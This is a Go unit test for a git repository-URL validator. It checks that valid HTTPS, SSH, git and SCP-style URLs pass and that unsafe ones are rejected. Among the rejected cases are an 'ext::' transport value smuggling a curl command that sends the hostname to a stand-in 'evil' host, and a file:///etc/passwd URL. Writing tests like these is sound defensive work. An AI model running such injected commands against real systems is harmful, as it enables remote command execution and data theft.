package handlers

import (
	"testing"
)

func TestValidateRepoURL(t *testing.T) {
	tests := []struct {
		name    string
		repoURL string
		wantErr bool
	}{
		{
			name:    "Valid HTTPS URL",
			repoURL: "https://github.com/user/repo.git",
			wantErr: false,
		},
		{
			name:    "Valid HTTP URL",
			repoURL: "http://github.com/user/repo.git",
			wantErr: false,
		},
		{
			name:    "Valid SSH URL",
			repoURL: "ssh://git@github.com/user/repo.git",
			wantErr: false,
		},
		{
			name:    "Valid Git protocol",
			repoURL: "git://github.com/user/repo.git",
			wantErr: false,
		},
		{
			name:    "Valid SCP-style",
			repoURL: "git@github.com:user/repo.git",
			wantErr: false,
		},
		{
			name:    "Empty URL",
			repoURL: "",
			wantErr: true,
		},
		{
			name:    "URL too long",
			repoURL: "https://github.com/" + string(make([]byte, 600)),
			wantErr: true,
		},
		{
			name:    "Blocked ext:: transport",
			repoURL: "ext::sh -c 'curl http://evil/$HOSTNAME'",
			wantErr: true,
		},
		{
			name:    "Blocked file:// protocol",
			repoURL: "file:///etc/passwd",
			wantErr: true,
		},
		{
			name:    "Blocked fd:// protocol",
			repoURL: "fd://foo",
			wantErr: true,
		},
		{
			name:    "No scheme",
			repoURL: "github.com/user/repo",
			wantErr: true,
		},
		{
			name:    "FTP not allowed",
			repoURL: "ftp://github.com/user/repo.git",
			wantErr: true,
		},
		{
			name:    "SFTP not allowed",
			repoURL: "sftp://github.com/user/repo.git",
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateRepoURL(tt.repoURL)
			if (err != nil) != tt.wantErr {
				t.Errorf("validateRepoURL() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}
